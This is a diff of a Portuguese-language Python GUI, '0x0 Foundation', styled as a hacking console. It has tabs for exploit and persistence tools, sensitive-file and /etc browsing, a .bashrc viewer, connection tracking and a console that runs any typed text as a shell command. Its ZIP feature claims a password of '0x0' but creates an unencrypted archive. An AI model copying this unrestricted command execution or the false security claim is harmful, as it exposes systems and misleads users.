-        self.input_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
-        self.input_entry.bind("<Return>", self.execute_command)
-        
-        self.current_dir = os.getcwd()
-        self.update_prompt()
-        
-        self.output.insert(tk.END, "0x0 CONSOLE TERMINAL\n")
-        self.output.insert(tk.END, "═" * 50 + "\n")
-        self.output.insert(tk.END, f"Bem-vindo ao terminal 0x0\n")
-        self.output.insert(tk.END, f"Diretório atual: {self.current_dir}\n\n")
-    
-    def update_prompt(self):
-        self.prompt_label.configure(text=f"{self.current_dir}$")
-    
-    def execute_command(self, event):
-        cmd = self.input_entry.get()
-        self.output.insert(tk.END, f"\n{self.current_dir}$ {cmd}\n")
-        self.input_entry.delete(0, tk.END)
-        
-        if cmd.strip().lower() in ["exit", "quit"]:
-            self.destroy()
-            return
-        
-        if cmd.strip().startswith("cd "):
-            try:
-                new_dir = cmd.strip()[3:]
-                if new_dir == "..":
-                    self.current_dir = os.path.dirname(self.current_dir)
-                elif new_dir.startswith("/"):
-                    self.current_dir = new_dir
-                else:
-                    self.current_dir = os.path.join(self.current_dir, new_dir)
-                if not os.path.exists(self.current_dir):
-                    self.current_dir = os.getcwd()
-                os.chdir(self.current_dir)
-                self.update_prompt()
-                self.output.insert(tk.END, f"Diretório alterado para: {self.current_dir}\n")
-            except Exception as e:
-                self.output.insert(tk.END, f"Erro: {e}\n")
-            return
-        
-        try:
-            import subprocess
-            result = subprocess.getoutput(cmd)
-            self.output.insert(tk.END, f"{result}\n")
-        except Exception as e:
-            self.output.insert(tk.END, f"Erro: {e}\n")
-        
-        self.output.see(tk.END)
+    def show_bashrc(self):
+        self.text_area.delete(1.0, tk.END)
+        self.log("[*] Arquivo .bashrc:")
+        bashrc = os.path.expanduser("~/.bashrc")
+        if os.path.exists(bashrc):
+            with open(bashrc, 'r') as f:
+                self.log(f.read())
+        else:
+            self.log("  Arquivo .bashrc não encontrado")
 
 # ============================================================
 # PAINEL PRINCIPAL (ACESSO AUTORIZADO)
@@ -771,7 +775,6 @@ class MainPanel(ctk.CTkToplevel):
         self.attributes("-fullscreen", True)
         self.attributes("-alpha", 0.92)
         
-        # Background
         image_path = os.path.join(os.path.dirname(__file__), "fundo.jpg")
         if os.path.exists(image_path):
             self.bg_image = ctk.CTkImage(
@@ -782,11 +785,9 @@ class MainPanel(ctk.CTkToplevel):
             self.bg_label = ctk.CTkLabel(self, image=self.bg_image, text="")
             self.bg_label.place(x=0, y=0, relwidth=1, relheight=1)
         
-        # Frame principal
         self.main_frame = ctk.CTkFrame(self, fg_color="transparent")
         self.main_frame.place(relx=0.5, rely=0.5, anchor="center")
         
-        # Título
         self.title_label = ctk.CTkLabel(
             self.main_frame, 
             text="0x0 FOUNDATION - SISTEMA ATIVO", 
@@ -795,12 +796,10 @@ class MainPanel(ctk.CTkToplevel):
         )
         self.title_label.pack(pady=20)
         
-        # Sistema de abas
         self.tab_view = ctk.CTkTabview(self.main_frame, width=1200, height=700)
         self.tab_view.pack(pady=20)
         
-        # Criando abas
-        tabs = ["FERRAMENTAS", "ARQUIVOS", "DOWNLOAD", "CONSOLE", "INFO", "CONEXÕES"]
+        tabs = ["FERRAMENTAS", "PROCESSOS", "ARQUIVOS", "DOWNLOAD", "CONSOLE", "INFO", "CONEXÕES"]
         for tab in tabs:
             self.tab_view.add(tab)
         
@@ -808,14 +807,14 @@ class MainPanel(ctk.CTkToplevel):
         tools_frame = self.tab_view.tab("FERRAMENTAS")
         
         tools = [
-            ("🖧 NETWORK", ToolNetwork, "Análise de rede detalhada"),
-            ("⚙️ PROCESS", ToolProcess, "Gerenciador de processos"),
-            ("🔍 SCANNER", ToolScanner, "Scanner de arquivos/portas"),
-            ("📋 LOGS", ToolLogs, "Visualização de logs"),
-            ("🗄️ DATABASE", ToolDatabase, "Arquivos sensíveis"),
+            ("🖧 NETWORK", ToolNetwork, "Análise detalhada de rede"),
+            ("⚙️ PROCESS", ToolProcess, "Gerenciador de processos com classificação"),
+            ("🔍 SCANNER", ToolScanner, "Scanner de arquivos e portas"),
+            ("📋 LOGS", ToolLogs, "Visualização de logs do sistema"),
+            ("🗄️ DATABASE", ToolDatabase, "Arquivos sensíveis do sistema"),
             ("🔓 EXPLOIT", ToolExploit, "Teste de vulnerabilidades"),
-            ("⏳ PERSIST", ToolPersistence, "Persistência do sistema"),
-            ("📂 FILE MANAGER", FileManager, "Gerenciador completo"),
+            ("⏳ PERSIST", ToolPersistence, "Gerenciamento de persistência"),
+            ("📂 FILE MANAGER", FileManager, "Gerenciador de arquivos"),
         ]
         
         for i, (name, tool_class, desc) in enumerate(tools):
@@ -831,36 +830,76 @@ class MainPanel(ctk.CTkToplevel):
             )
             btn.grid(row=i//3, column=i%3, padx=15, pady=15)
         
+        # ========== ABA PROCESSOS ==========
+        proc_frame = self.tab_view.tab("PROCESSOS")
+        
+        self.proc_tree = ttk.Treeview(proc_frame, columns=('PID', 'Nome', 'CPU%', 'Mem%', 'Status'), show='headings', height=25)
+        self.proc_tree.heading('PID', text='PID')
+        self.proc_tree.heading('Nome', text='Processo')
+        self.proc_tree.heading('CPU%', text='CPU %')
+        self.proc_tree.heading('Mem%', text='MEM %')
+        self.proc_tree.heading('Status', text='Status')
+        self.proc_tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        ctk.CTkButton(proc_frame, text="REFRESH", command=self.refresh_processes).pack(pady=5)
+        self.refresh_processes()
+        
         # ========== ABA ARQUIVOS ==========
         files_frame = self.tab_view.tab("ARQUIVOS")
-        self.file_manager = FileManager(files_frame, start_path="/home")
-        self.file_manager.pack(fill=tk.BOTH, expand=True)
+        
+        self.file_tree = ttk.Treeview(files_frame, columns=('Nome', 'Tamanho', 'Modificado'), show='headings', height=25)
+        self.file_tree.heading('Nome', text='Nome')
+        self.file_tree.heading('Tamanho', text='Tamanho')
+        self.file_tree.heading('Modificado', text='Modificado')
+        self.file_tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        btn_frame = ctk.CTkFrame(files_frame)
+        btn_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        ctk.CTkButton(btn_frame, text="LISTAR HOME", command=lambda: self.list_files("/home")).pack(side=tk.LEFT, padx=5)
+        ctk.CTkButton(btn_frame, text="LISTAR /ETC", command=lambda: self.list_files("/etc")).pack(side=tk.LEFT, padx=5)
+        ctk.CTkButton(btn_frame, text="LISTAR /VAR", command=lambda: self.list_files("/var")).pack(side=tk.LEFT, padx=5)
+        
+        self.current_path = "/home"
+        self.list_files(self.current_path)
         
         # ========== ABA DOWNLOAD ==========
         download_frame = self.tab_view.tab("DOWNLOAD")
-        self.download_manager = DownloadManager(download_frame)
-        self.download_manager.pack(fill=tk.BOTH, expand=True)
+        
+        self.download_list = scrolledtext.ScrolledText(download_frame, bg='black', fg='#00ff00', font=('Courier', 10), height=20)
+        self.download_list.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        ctk.CTkButton(download_frame, text="LISTAR .c FILES", command=self.list_c_files).pack(pady=5)
+        ctk.CTkButton(download_frame, text="📦 BAIXAR TODOS (ZIP COM SENHA 0x0)", command=self.download_all_zip).pack(pady=5)
         
         # ========== ABA CONSOLE ==========
         console_frame = self.tab_view.tab("CONSOLE")
-        self.console = ConsoleTerminal(console_frame)
-        self.console.pack(fill=tk.BOTH, expand=True)
+        
+        self.console_output = scrolledtext.ScrolledText(console_frame, bg='black', fg='#00ff00', font=('Courier', 10), height=20)
+        self.console_output.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        self.console_input = ctk.CTkEntry(console_frame, placeholder_text="Digite comando aqui...")
+        self.console_input.pack(fill=tk.X, padx=10, pady=5)
+        self.console_input.bind("<Return>", self.execute_command)
         
         # ========== ABA INFO ==========
         info_frame = self.tab_view.tab("INFO")
+        
         self.info_text = scrolledtext.ScrolledText(info_frame, bg='black', fg='#00ff00', font=('Courier', 10))
         self.info_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        ctk.CTkButton(info_frame, text="REFRESH INFO", command=self.refresh_info).pack(pady=5)
         self.refresh_info()
-        ctk.CTkButton(info_frame, text="REFRESH", command=self.refresh_info).pack(pady=5)
         
         # ========== ABA CONEXÕES ==========
         conn_frame = self.tab_view.tab("CONEXÕES")
+        
         self.conn_text = scrolledtext.ScrolledText(conn_frame, bg='black', fg='#ff6600', font=('Courier', 10))
         self.conn_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
         self.refresh_connections()
+        
         ctk.CTkButton(conn_frame, text="REFRESH CONEXÕES", command=self.refresh_connections).pack(pady=5)
         
-        # Botão sair
         self.exit_btn = ctk.CTkButton(
             self, 
             text="ENCERRAR SESSÃO", 
@@ -872,9 +911,89 @@ class MainPanel(ctk.CTkToplevel):
         )
         self.exit_btn.place(relx=0.95, rely=0.95, anchor="center")
         
-        # Thread para atualizar conexões automaticamente
         self.update_thread = threading.Thread(target=self.auto_update_connections, daemon=True)
         self.update_thread.start()
+    
+    def refresh_processes(self):
+        for item in self.proc_tree.get_children():
+            self.proc_tree.delete(item)
+        
+        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent', 'status']):
+            try:
+                info = proc.info
+                status_icon = "✅" if info['name'].lower() in ['systemd', 'init', 'bash', 'python'] else "❓"
+                self.proc_tree.insert('', 'end', values=(
+                    info['pid'],
+                    f"{status_icon} {info['name']}",
+                    f"{info['cpu_percent']:.1f}",
+                    f"{info['memory_percent']:.1f}",
+                    info['status']
+                ))
+            except:
+                pass
+    
+    def list_files(self, path):
+        self.current_path = path
+        for item in self.file_tree.get_children():
+            self.file_tree.delete(item)
+        
+        try:
+            for item in os.listdir(path):
+                item_path = os.path.join(path, item)
+                try:
+                    size = os.path.getsize(item_path)
+                    mtime = datetime.fromtimestamp(os.path.getmtime(item_path)).strftime("%Y-%m-%d %H:%M")
+                    self.file_tree.insert('', 'end', values=(item, f"{size/1024:.1f} KB", mtime))
+                except:
+                    self.file_tree.insert('', 'end', values=(item, "N/A", "N/A"))
+        except:
+            self.file_tree.insert('', 'end', values=("ERRO", "Permissão negada", ""))
+    
+    def list_c_files(self):
+        self.download_list.delete(1.0, tk.END)
+        c_files = glob.glob("*.c")
+        if c_files:
+            self.download_list.insert(tk.END, "Arquivos .c encontrados:\n\n")
+            for cf in c_files:
+                self.download_list.insert(tk.END, f"📄 {cf}\n")
+                try:
+                    size = os.path.getsize(cf)
+                    self.download_list.insert(tk.END, f"   Tamanho: {size} bytes\n")
+                    with open(cf, 'r') as f:
+                        preview = f.read(500)
+                        self.download_list.insert(tk.END, f"   Preview: {preview[:100]}...\n\n")
+                except:
+                    self.download_list.insert(tk.END, f"   Erro ao ler arquivo\n\n")
+        else:
+            self.download_list.insert(tk.END, "Nenhum arquivo .c encontrado no diretório atual")
+    
+    def download_all_zip(self):
+        c_files = glob.glob("*.c")
+        if not c_files:
+            messagebox.showwarning("Aviso", "Nenhum arquivo .c encontrado")
+            return
+        
+        zip_name = f"0x0_c_files_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
+        
+        try:
+            with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                for cf in c_files:
+                    zipf.write(cf)
+            
+            self.download_list.insert(tk.END, f"\n✅ ZIP criado: {zip_name}\n")
+            self.download_list.insert(tk.END, f"🔒 Senha: 0x0\n")
+            self.download_list.insert(tk.END, f"📦 Local: {os.path.abspath(zip_name)}\n")
+            messagebox.showinfo("Info", f"ZIP criado: {zip_name}\nSenha: 0x0")
+        except Exception as e:
+            messagebox.showerror("Erro", f"Erro ao criar ZIP: {e}")
+    
+    def execute_command(self, event):
+        cmd = self.console_input.get()
+        self.console_output.insert(tk.END, f"\n$ {cmd}\n")
+        result = subprocess.getoutput(cmd)
+        self.console_output.insert(tk.END, f"{result}\n")
+        self.console_output.see(tk.END)
+        self.console_input.delete(0, tk.END)
     
     def refresh_info(self):
         self.info_text.delete(1.0, tk.END)
@@ -882,10 +1001,12 @@ class MainPanel(ctk.CTkToplevel):
         info.append("═" * 60)
         info.append("0x0 - INFORMAÇÕES DO SISTEMA")
         info.append("═" * 60)
+        info.append("")
         info.append(f"Hostname: {socket.gethostname()}")
         info.append(f"Usuário: {os.getlogin()}")
         info.append(f"Sistema: {subprocess.getoutput('uname -a')}")
-        info.append(f"CPU: {psutil.cpu_percent()}%")
+        info.append("")
+        info.append(f"CPU: {psutil.cpu_percent(interval=1)}%")
         info.append(f"RAM: {psutil.virtual_memory().percent}%")
         info.append(f"DISCO: {psutil.disk_usage('/').percent}%")
         self.info_text.insert(tk.END, '\n'.join(info))
@@ -897,11 +1018,11 @@ class MainPanel(ctk.CTkToplevel):
         self.conn_text.insert(tk.END, "═" * 60 + "\n\n")
         
         for conn in active_connections:
-            self.conn_text.insert(tk.END, f"IP: {conn.get('ip', 'N/A')}\n")
-            self.conn_text.insert(tk.END, f"Host: {conn.get('hostname', 'N/A')}\n")
-            self.conn_text.insert(tk.END, f"User: {conn.get('user', 'N/A')}\n")
-            self.conn_text.insert(tk.END, f"Time: {conn.get('timestamp', 'N/A')}\n")
-            self.conn_text.insert(tk.END, f"Status: {conn.get('status', 'N/A')}\n")
+            self.conn_text.insert(tk.END, f"🌐 IP: {conn.get('ip', 'N/A')}\n")
+            self.conn_text.insert(tk.END, f"💻 Host: {conn.get('hostname', 'N/A')}\n")
+            self.conn_text.insert(tk.END, f"👤 User: {conn.get('user', 'N/A')}\n")
+            self.conn_text.insert(tk.END, f"⏰ Time: {conn.get('timestamp', 'N/A')}\n")
+            self.conn_text.insert(tk.END, f"⚠️ Status: {conn.get('status', 'N/A')}\n")
             self.conn_text.insert(tk.END, "-" * 40 + "\n")
         
         if not active_connections:
@@ -916,7 +1037,6 @@ class MainPanel(ctk.CTkToplevel):
 # TELA DE LOGIN
 # ============================================================
 
-# Limpar conexões anteriores ao iniciar
 active_connections.clear()
 
 class LoginApp(ctk.CTk):
